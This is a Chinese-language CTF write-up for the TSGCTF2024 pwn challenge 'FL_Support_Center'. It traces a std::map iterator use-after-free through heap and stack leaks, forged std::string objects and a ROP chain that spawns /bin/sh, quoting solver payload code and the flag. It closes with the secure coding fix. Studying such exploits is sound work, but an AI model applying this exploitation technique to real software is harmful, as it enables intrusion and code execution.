# TSGCTF2024 FL_Support_Center

## 题目简述

程序用两个 `std::map<std::string, std::string>` 保存好友与黑名单。删除好友时，循环先保存 `next`，随后可能擦除当前迭代器 `it`，但同一轮中又继续解引用它：

```cpp
auto next = std::next(it);

if (it->first == name) {
  if (it->first != "FL*Support*Center@fl.support.center") {
    friends_list.erase(it);
    /* 更新 black_list */
  }

  if (it->first == "FL*Support*Center@fl.support.center") {
    /* 读取、打印并修改 it->second */
  }
}
```

`friends_list.erase(it)` 后 `it` 已失效，后续访问 `it->first` 和 `it->second` 是 use-after-free。题目没有正式官方 WP，但仓库提供了设计说明、源码和完整 solver，足以还原从堆泄露到 ROP 的利用链。

## 解题过程

### 1. 制造悬空节点并泄露堆基址

先创建长度为 `0x23` 的用户名，删除后再以同名添加，并给它设置 0x50 字节消息。再次删除时，好友树节点和长字符串缓冲区被释放；函数仍持有悬空迭代器，而紧接着的黑名单更新与举报消息会让分配器复用这些块。

solver 把举报内容设为支持中心名称：

```python
support = b"FL*Support*Center@fl.support.center"
addr = remove(account1, ban=True, ban_payload=support,
              admin=True, yon=False)
```

复用后的悬空 `it->first` 被解释为该名称，于是错误进入支持中心分支，并打印悬空 `it->second`。长消息缓冲区释放后开头保存了 glibc safe-linking 编码的 tcache 指针；打印结果前 8 字节可用于还原堆地址。官方环境对应公式为：

```python
heap_base = (u64(leak[:8]) << 12) - 0x12000
```

其中 `0x12000` 是本题固定分配序列下的页内偏移，不能直接照搬到其他 libc 或堆布局。

### 2. 伪造 map 节点中的两个 `std::string`

64 位 libstdc++ 的红黑树节点头占 0x20 字节，后面依次是键和值两个 `std::string`。solver 在可预测的堆位置构造伪节点，核心布局可概括为：

```text
+0x00  0x20 字节树节点元数据
+0x20  key.data     -> 堆中的支持中心名称
+0x28  key.length   = 0x23
+0x30  key.capacity = 0x23
+0x40  value.data   -> 含有栈指针的堆节点元数据
+0x48  value.length = 0xf0
+0x50  value.capacity = 0xf0
```

再次触发悬空迭代器后，伪造的 key 让比较通过；程序在提示“是否删除旧消息”时按伪造的 `value.data/length` 打印 0xf0 字节。该堆区域包含 `std::map` 哨兵/父节点关系保存的栈地址，solver 从泄露的第 8 到 15 字节得到：

```python
stack_addr = u64(leak[8:16])
message_ret_addr = stack_addr - 0x20
```

### 3. 把字符串赋值转为栈读写

程序询问是否删除旧消息后，会把新的局部 `message` 赋给悬空 `it->second`。因为这个 `std::string` 对象的目标指针和容量已受控，赋值会把攻击者数据复制到指定堆元数据。solver 保留泄露块的前 0x40 字节，再在偏移 0x40 处伪造另一个字符串对象：

```python
payload = leak[:0x40]
payload += p64(message_ret_addr)
payload += p64(0x130)       # length
payload += p64(0x130)       # capacity
payload += p64(0)
```

此后菜单的 `List` 功能按该字符串对象从栈上输出数据。返回内容中包含 `__libc_start_main` 路径附近的地址，官方 solver 用构建对应偏移计算：

```python
libc.address = u64(stack_dump[0x19e:0x1a6]) - 0x29d90
```

同一个伪字符串的 `data` 指针已经指向 `message()` 返回地址。向相应联系人更新消息时，`std::string` 赋值把输入直接复制到这个栈地址，从而形成受长度限制但足够使用的返回地址覆盖原语。

### 4. 写入 libc ROP

有了 libc 基址后构造：

```text
pop rdi; ret
address of "/bin/sh"
pop rdx; pop rbx; ret
0, 0
pop rax; ret
59
pop rsi; ret
0
syscall
```

把这段链作为联系人消息写入 `message_ret_addr`，函数返回时执行 `execve("/bin/sh", NULL, NULL)`。读取 flag 得到：

```text
TSGCTF{57r3553d_b3cau53_7h3r3_15_n0_3a5y_way_70_un5ub5cr1b3_fr0m_7h3_d3l1v3ry_ma1l1ng5}
```

## 方法总结

本题的决定性漏洞是擦除 `std::map` 节点后继续使用迭代器。利用者借稳定的分配顺序先从释放字符串中取得 safe-linking 堆信息，再伪造树节点内的 `std::string` 指针、长度和容量，把正常的打印与赋值操作升级为定址读写，最后泄露 libc 并覆盖栈返回地址。C++ 容器迭代器在 `erase` 后必须立即停止使用；正确写法应在擦除前完成所有判断，或使用 `it = container.erase(it)` 返回的新迭代器，并确保后续逻辑不再引用旧节点。
